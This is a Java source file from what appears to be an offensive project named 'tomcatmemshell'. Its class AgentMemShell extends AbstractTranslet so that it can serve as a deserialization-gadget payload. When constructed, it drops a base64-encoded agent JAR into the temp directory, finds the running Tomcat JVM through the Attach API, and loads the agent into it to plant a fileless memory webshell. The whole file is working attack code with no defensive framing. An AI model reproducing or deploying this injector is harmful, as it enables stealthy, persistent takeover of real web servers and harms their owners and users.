package org.example.tomcatmemshell.Agent;

import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;

import java.io.File;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.io.FileOutputStream;
import java.io.IOException;
import java.util.Base64;


public class AgentMemShell extends AbstractTranslet {
    public static String filename = "agentJAR.jar";
    public static String agentJAR_PATH = "E:\\CODE_COLLECT\\Idea_java_ProTest\\TomcatMemshell\\src\\main\\java\\org\\example\\tomcatmemshell\\Agent\\AgentJAR-1.0-SNAPSHOT.jar";
    public AgentMemShell(){
        try{
            String JarBaseString =  encodeFileToBase64(agentJAR_PATH);
            String JarPath = getJARFile(JarBaseString);//写Jar文件
            java.io.File toolsPath = new java.io.File(System.getProperty("java.home").replace("jre","lib") + java.io.File.separator + "tools.jar");
            java.net.URL url = toolsPath.toURI().toURL();
            java.net.URLClassLoader classLoader = new java.net.URLClassLoader(new java.net.URL[]{url});
            Class/*<?>*/ MyVirtualMachine = classLoader.loadClass("com.sun.tools.attach.VirtualMachine");
            Class/*<?>*/ MyVirtualMachineDescriptor = classLoader.loadClass("com.sun.tools.attach.VirtualMachineDescriptor");
            java.lang.reflect.Method listMethod = MyVirtualMachine.getDeclaredMethod("list",null);
            java.util.List/*<Object>*/ list = (java.util.List/*<Object>*/) listMethod.invoke(MyVirtualMachine,null);

            System.out.println("Running JVM list ...");
            for(int i=0;i<list.size();i++){
                Object o = list.get(i);
                java.lang.reflect.Method displayName = MyVirtualMachineDescriptor.getDeclaredMethod("displayName",null);
                java.lang.String name = (java.lang.String) displayName.invoke(o,null);
                // 列出当前有哪些 JVM 进程在运行
                // 这里的 if 条件根据实际情况进行更改
                if (name.contains("org.apache.catalina.startup.Bootstrap")){
                    // 获取对应进程的 pid 号
                    java.lang.reflect.Method getId = MyVirtualMachineDescriptor.getDeclaredMethod("id",null);
                    java.lang.String id = (java.lang.String) getId.invoke(o,null);
                    System.out.println("id >>> " + id);
                    java.lang.reflect.Method attach = MyVirtualMachine.getDeclaredMethod("attach",new Class[]{java.lang.String.class});
                    java.lang.Object vm = attach.invoke(o,new Object[]{id});
                    java.lang.reflect.Method loadAgent = MyVirtualMachine.getDeclaredMethod("loadAgent",new Class[]{java.lang.String.class});
                    loadAgent.invoke(vm,new Object[]{JarPath});
                    java.lang.reflect.Method detach = MyVirtualMachine.getDeclaredMethod("detach",null);
                    detach.invoke(vm,null);
                    System.out.println("Agent.jar Inject Success !!");
                    break;
                }
            }


        }catch (Exception e){
            e.printStackTrace();
        }
    }

    @Override
    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {

    }

    @Override
    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {

    }
    public  static  String getJARFile(String base64) throws IOException {
        if (base64 != null) {
            File JarDir = new File(System.getProperty("java.io.tmpdir"), "jar-lib");

            if (!JarDir.exists()) {
                JarDir.mkdir();
            }

            File jarFile =  new File(JarDir, filename);

            // 先删除已存在的 DLL 文件
            if (jarFile.exists()) {
                jarFile.delete();
            }

            byte[] bytes = Base64.getDecoder().decode(base64);
            if (bytes != null) {
                try (FileOutputStream fos = new FileOutputStream(jarFile)) {
                    fos.write(bytes);
                    fos.flush();
                }
            }
            return jarFile.getAbsolutePath();
        }
        return "";
    }
    public static String encodeFileToBase64(String filePath) throws IOException {
        byte[] fileBytes = Files.readAllBytes(Paths.get(filePath));
        return Base64.getEncoder().encodeToString(fileBytes);
    }
}
